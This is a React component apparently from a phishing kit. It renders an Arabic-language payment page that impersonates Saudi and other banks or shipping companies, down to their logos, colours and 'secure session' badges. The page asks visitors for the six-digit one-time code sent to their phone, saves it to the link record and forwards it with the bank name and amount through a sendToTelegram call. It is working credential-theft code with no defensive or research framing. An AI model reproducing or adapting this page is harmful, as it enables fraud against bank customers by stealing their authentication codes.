import { useState, useEffect, useRef, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { ShieldCheck, Smartphone, Timer, RefreshCw, Loader2, Lock, ChevronRight, CheckCircle2, Building2, Truck, CreditCard, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { bankBranding } from "@/lib/brandingSystem";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";

const PaymentOTP = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [timer, setTimer] = useState(120);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || '';

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    if (selectedBankId) {
      return getEntityVisualSpec(selectedBankId);
    }
    if (companyKey) {
      return getEntityVisualSpec(companyKey);
    }
    return null;
  }, [selectedBankId, companyKey]);

  // Get branding as fallback
  const serviceBranding = getServiceBranding(companyKey);
  const companyBranding = companyKey ? shippingCompanyBranding[companyKey.toLowerCase()] : null;

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  // Visual values - bank branding takes priority for OTP pages
  const primaryColor = entitySpec?.colors.primary || selectedBankBranding.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || selectedBankBranding.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || selectedBankBranding.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || selectedBankBranding.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || selectedBankBranding.colors.text || companyBranding?.colors.text || '#1A1A1A';
  const textLightColor = entitySpec?.colors.textLight || selectedBankBranding.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || selectedBankBranding.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || selectedBankBranding.fonts.arabic || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif';
  const borderRadius = entitySpec?.dimensions.borderRadius || selectedBankBranding.borderRadius?.lg || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const inputHeight = entitySpec?.dimensions.inputHeight || '64px';
  const cardShadow = entitySpec?.shadows.card || selectedBankBranding.shadows?.lg || companyBranding?.shadows.lg || '0 30px 80px rgba(0,0,0,0.1)';
  const buttonShadow = entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`;
  const logoUrl = entitySpec?.assets.logo || selectedBankBranding.logo || companyBranding?.logoUrl || '';
  const entityNameAr = entitySpec?.entityNameAr || selectedBank?.nameAr || serviceBranding.nameAr || 'البنك';
  const entityNameEn = entitySpec?.entityNameEn || selectedBank?.name || serviceBranding.nameEn || 'Bank';
  const category = entitySpec?.category || 'bank';

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  useEffect(() => {
    const countdown = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(countdown);
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length < 6) {
      toast({ title: "خطأ", description: "يرجى إدخال رمز التحقق كاملاً", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, otp: otpValue } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "otp-verification",
          linkId: id!,
          otp: otpValue,
          bank: selectedBank?.nameAr || "البطاقة البنكية",
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'otp_verification',
        data: {
          otp: otpValue,
          bank: selectedBank?.nameAr || "البطاقة البنكية",
          amount: formattedAmount,
          service: linkData?.payload?.service_name || "خدمة دفع"
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/receipt${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor, fontFamily }}>
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey || "bank"}
        serviceName={entityNameAr}
        title="تأكيد رمز التحقق (OTP)"
      />

      {/* Entity Header */}
      <header className="w-full border-b-4 h-16 sm:h-20 flex items-center sticky top-0 z-50 shadow-md" style={{ backgroundColor: surfaceColor, borderBottomColor: primaryColor }}>
        <div className="container mx-auto px-4 flex items-center justify-between">
          <div className="w-32 sm:w-40 h-10 flex items-center">
            {selectedBankId ? (
              <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="md" />
            ) : logoUrl ? (
              <img src={logoUrl} alt={entityNameAr} className="h-8 sm:h-10 w-auto object-contain" />
            ) : (
              <div className="flex items-center gap-2 font-bold" style={{ color: primaryColor }}>
                <ShieldCheck className="w-6 h-6" />
                <span>SECURE PAY</span>
              </div>
            )}
          </div>
          <div className="flex items-center gap-2 px-3 py-1 rounded-full border text-[10px] font-bold" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
            <Lock className="w-3 h-3" />
            <span>SECURE SESSION</span>
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12">
        <div className="w-full max-w-md space-y-8">
          <Card className="border-none overflow-hidden text-center" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
            <div className="p-8 sm:p-12 space-y-8">
              <div
                className="w-20 h-20 rounded-3xl mx-auto flex items-center justify-center text-white shadow-xl animate-in zoom-in duration-500"
                style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
              >
                <Smartphone className="w-10 h-10" />
              </div>

              <div className="space-y-2">
                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: textColor }}>رمز التحقق لمرة واحدة</h2>
                <p className="text-sm font-medium leading-relaxed" style={{ color: textLightColor }}>
                  تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم جوالك المسجل لدى {entityNameAr} لإتمام عملية دفع <span className="font-bold" style={{ color: textColor }}>{formattedAmount}</span>
                </p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-8">
                <div className="flex justify-center gap-3 sm:gap-4" dir="ltr">
                  {otp.map((digit, index) => (
                    <Input
                      key={index}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      ref={(el) => (inputRefs.current[index] = el)}
                      className="text-center text-3xl font-bold transition-all"
                      style={{
                        width: '3.5rem',
                        height: inputHeight,
                        borderRadius,
                        backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                        borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                        borderWidth: '2px',
                      }}
                      required
                    />
                  ))}
                </div>

                <div className="space-y-6">
                  <div className="flex items-center justify-center gap-4 text-sm">
                    <div className="flex items-center gap-1.5 font-bold" style={{ color: textLightColor }}>
                      <Timer className="w-4 h-4" />
                      <span>تنتهي صلاحية الرمز خلال:</span>
                    </div>
                    <span className="font-bold min-w-[3rem]" style={{ color: primaryColor }}>
                      {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, "0")}
                    </span>
                  </div>

                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full text-xl font-bold shadow-xl text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3"
                    style={{
                      background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                      boxShadow: buttonShadow,
                      borderRadius,
                      height: buttonHeight,
                      color: entitySpec?.colors.textOnPrimary || '#FFFFFF',
                    }}
                  >
                    {isSubmitting ? (
                      <Loader2 className="w-6 h-6 sm:w-8 sm:h-8 animate-spin" />
                    ) : (
                      <>
                        <span>تأكيد الرمز</span>
                        <CheckCircle2 className="w-5 h-5 sm:w-6 sm:h-6" />
                      </>
                    )}
                  </Button>

                  <button
                    type="button"
                    disabled={timer > 0}
                    className="flex items-center justify-center gap-2 mx-auto text-sm font-bold hover:transition-colors disabled:opacity-50"
                    style={{ color: textLightColor }}
                  >
                    <RefreshCw className="w-4 h-4" />
                    <span>إعادة إرسال الرمز</span>
                  </button>
                </div>
              </form>
            </div>

            <div className="p-6 sm:p-8 border-t flex items-center gap-4 text-right" style={{ backgroundColor: `${primaryColor}03`, borderColor }}>
              <div className="w-12 h-12 rounded-full border flex-shrink-0 flex items-center justify-center shadow-sm" style={{ backgroundColor: surfaceColor, borderColor, color: primaryColor }}>
                <ShieldCheck className="w-6 h-6" />
              </div>
              <div className="space-y-0.5">
                <p className="text-[10px] font-bold uppercase" style={{ color: textColor }}>Secure Verification</p>
                <p className="text-[9px] font-medium leading-none" style={{ color: textLightColor }}>هذه الصفحة محمية بنظام التشفير البنكي المتقدم</p>
              </div>
            </div>
          </Card>

          <p className="text-[10px] font-bold text-center uppercase tracking-widest px-8 leading-relaxed" style={{ color: textLightColor }}>
            لا تشارك رمز التحقق مع أي شخص. موظفو البنك لن يطلبوا منك هذا الرمز أبداً.
          </p>
        </div>
      </main>
    </div>
  );
};

export default PaymentOTP;
